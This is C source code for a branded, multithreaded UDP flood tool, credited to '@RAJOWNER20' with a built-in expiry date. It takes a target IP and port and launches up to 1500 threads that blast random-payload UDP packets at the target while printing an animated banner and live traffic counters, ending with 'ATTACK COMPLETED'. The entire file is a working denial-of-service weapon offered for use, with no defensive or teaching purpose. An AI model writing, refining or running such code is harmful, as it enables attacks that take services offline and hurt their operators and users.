#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <time.h>
#include <math.h>
#include <sched.h>
#include <signal.h>

#define BURST_COUNT 60
#define DOUBLE_FACTOR 2

#define EXPIRY_YEAR 2025
#define EXPIRY_MONTH 10
#define EXPIRY_DAY 15
#define DEFAULT_PACKET_SIZE 512
#define DEFAULT_THREAD_COUNT 1500
#define UPDATE_INTERVAL_US 100000
#define BURST_SIZE 1000

typedef struct {
    char *target_ip;
    int target_port;
    int duration;
    int packet_size;
    int thread_id;
} attack_params;

volatile int keep_running = 1;
volatile unsigned long total_packets_sent = 0;
volatile unsigned long long total_bytes_sent = 0;
char *global_payload = NULL;

void handle_signal(int signal) {
    keep_running = 0;
}

void generate_random_payload(char *payload, int size) {
    for (int i = 0; i < size; i++) {
        payload[i] = (rand() % 256);
    }
}

void *udp_flood(void *arg) {
    attack_params *params = (attack_params *)arg;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        return NULL;
    }

    struct sockaddr_in server_addr;
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(params->target_port);
    server_addr.sin_addr.s_addr = inet_addr(params->target_ip);

    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(params->thread_id % sysconf(_SC_NPROCESSORS_ONLN), &cpuset);
    int result = pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);
    if (result != 0) {
        fprintf(stderr, "Failed to set CPU affinity for thread %d: %s\n", params->thread_id, strerror(result));
        close(sock);
        return NULL;
    }

    time_t start_time = time(NULL);
    while (keep_running && difftime(time(NULL), start_time) < params->duration) {
        for (int i = 0; i < BURST_SIZE; i++) {
            if (sendto(sock, global_payload, params->packet_size, 0,
                       (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
                perror("sendto failed");
                break;
            }
            __sync_fetch_and_add(&total_packets_sent, 1);
            __sync_fetch_and_add(&total_bytes_sent, params->packet_size);
        }
        usleep(UPDATE_INTERVAL_US);
    }

    close(sock);
    return NULL;
}

void rgb_cycle(int step, char *buffer, size_t bufsize) {
    double frequency = 0.1;
    int red = (int)(sin(frequency * step + 0) * 127 + 128);
    int green = (int)(sin(frequency * step + 2) * 127 + 128);
    int blue = (int)(sin(frequency * step + 4) * 127 + 128);
    snprintf(buffer, bufsize, "\033[38;2;%d;%d;%dm", red, green, blue);
}

void print_color_text(const char *text, int step_offset) {
    char color_code[32];
    rgb_cycle(step_offset, color_code, sizeof(color_code));
    printf("%s%s\033[0m", color_code, text);
}

void print_stylish_text(int step) {
    time_t now = time(NULL);
    struct tm expiry_date = {0};
    expiry_date.tm_year = EXPIRY_YEAR - 1900;
    expiry_date.tm_mon = EXPIRY_MONTH - 1;
    expiry_date.tm_mday = EXPIRY_DAY;
    time_t expiry_time = mktime(&expiry_date);

    double remaining_seconds = difftime(expiry_time, now);
    int remaining_days = (int)(remaining_seconds / (60 * 60 * 24));
    int remaining_hours = (int)fmod((remaining_seconds / (60 * 60)), 24);
    int remaining_minutes = (int)fmod((remaining_seconds / 60), 60);
    int remaining_seconds_int = (int)fmod(remaining_seconds, 60);

    char time_str[64];
    snprintf(time_str, sizeof(time_str), "%d days, %02d:%02d:%02d",
             remaining_days, remaining_hours, remaining_minutes, remaining_seconds_int);

    printf("\n");
    print_color_text("╔════════════════════════════════════════╗\n", step);
    print_color_text("║ ", step + 30); print_color_text(" ", step + 60);
    print_color_text("»»—— 𝐀𝐋𝐎𝐍𝐄 ƁƠƳ ♥ SPECIAL EDITION", step + 90); print_color_text(" ", step + 120);
    print_color_text("║\n", step + 150);
    print_color_text("╠════════════════════════════════════════╣\n", step + 180);
    print_color_text("║  DEVELOPED BY: @RAJOWNER20           ║\n", step + 210);
    print_color_text("║  EXPIRY TIME: ", step + 240);
    print_color_text(time_str, step + 270); print_color_text("      ║\n", step + 300);
    print_color_text("╠════════════════════════════════════════╣\n", step + 480);
    print_color_text("║ ", step + 510); print_color_text(" ", step + 540);
    print_color_text("KYA GUNDA BANEGA RE 😂.              ", step + 570); print_color_text(" ", step + 600);
    print_color_text("║\n", step + 630);
    print_color_text("╚════════════════════════════════════════╝\n\n", step + 660);
}

void display_progress(time_t start_time, int duration, int step) {
    time_t now = time(NULL);
    int elapsed = (int)difftime(now, start_time);
    int remaining = duration - elapsed;
    if (remaining < 0) remaining = 0;

    char progress_str[256];
    snprintf(progress_str, sizeof(progress_str),
             "Time Remaining: %02d:%02d | Packets Sent: %lu | Data Sent: %.2f MB",
             remaining / 60, remaining % 60,
             total_packets_sent,
             (double)total_bytes_sent / (1024 * 1024));

    printf("\033[2K\r");
    print_color_text(progress_str, step);
    fflush(stdout);
}

int main(int argc, char *argv[]) {
    srand(time(NULL));

    time_t now = time(NULL);
    struct tm *local = localtime(&now);
    if (local->tm_year + 1900 > EXPIRY_YEAR ||
        (local->tm_year + 1900 == EXPIRY_YEAR && local->tm_mon + 1 > EXPIRY_MONTH) ||
        (local->tm_year + 1900 == EXPIRY_YEAR && local->tm_mon + 1 == EXPIRY_MONTH && local->tm_mday > EXPIRY_DAY)) {
        print_color_text("Expired. Khatam Ho Gya HAI Developar Se Contact Kijiye @RAJOWNER20.\n", 0);
        return EXIT_FAILURE;
    }

    if (argc < 3) {
        print_color_text("Example: ", 0);
        printf("%s 192.168.1.1 80 60\n", argv[0]);
        return EXIT_FAILURE;
    }

    char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int duration = (argc > 3) ? atoi(argv[3]) : 60;
    int packet_size = (argc > 4) ? atoi(argv[4]) : DEFAULT_PACKET_SIZE;
    int thread_count = (argc > 5) ? atoi(argv[5]) : DEFAULT_THREAD_COUNT;

    if (packet_size <= 0 || thread_count <= 0) {
        print_color_text("Invalid packet size or thread count. Using defaults.\n", 0);
        packet_size = DEFAULT_PACKET_SIZE;
        thread_count = DEFAULT_THREAD_COUNT;
    }

    signal(SIGINT, handle_signal);

    global_payload = (char *)malloc(packet_size);
    if (!global_payload) {
        print_color_text("Failed to allocate memory for payload\n", 0);
        return EXIT_FAILURE;
    }
    generate_random_payload(global_payload, packet_size);

    pthread_t threads[thread_count];
    attack_params params[thread_count];

    time_t start_time = time(NULL);
    int color_step = 0;

    print_stylish_text(color_step);

    // Create threads
    for (int i = 0; i < thread_count; i++) {
        params[i].target_ip = target_ip;
        params[i].target_port = target_port;
        params[i].duration = duration;
        params[i].packet_size = packet_size;
        params[i].thread_id = i;

        if (pthread_create(&threads[i], NULL, udp_flood, &params[i]) != 0) {
            print_color_text("Failed to create thread\n", color_step);
            keep_running = 0;
            break;
        }
    }

    // Display progress while attack runs
    while (keep_running && time(NULL) < start_time + duration) {
        display_progress(start_time, duration, color_step);
        usleep(UPDATE_INTERVAL_US);
        color_step = (color_step + 5) % 360;

        printf("\033[2J\033[H");
        print_stylish_text(color_step);
    }

    // Wait for all threads to finish
    for (int i = 0; i < thread_count; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("\n");
    print_color_text("ATTACK COMPLETED. ", color_step);
    print_color_text("TOTAL PACKETS SENT: ", color_step + 60);
    printf("%lu | ", total_packets_sent);
    print_color_text("TOTAL DATA SENT: ", color_step + 120);
    printf("%.2f MB\n", (double)total_bytes_sent / (1024 * 1024));

    free(global_payload);
    return 0;
}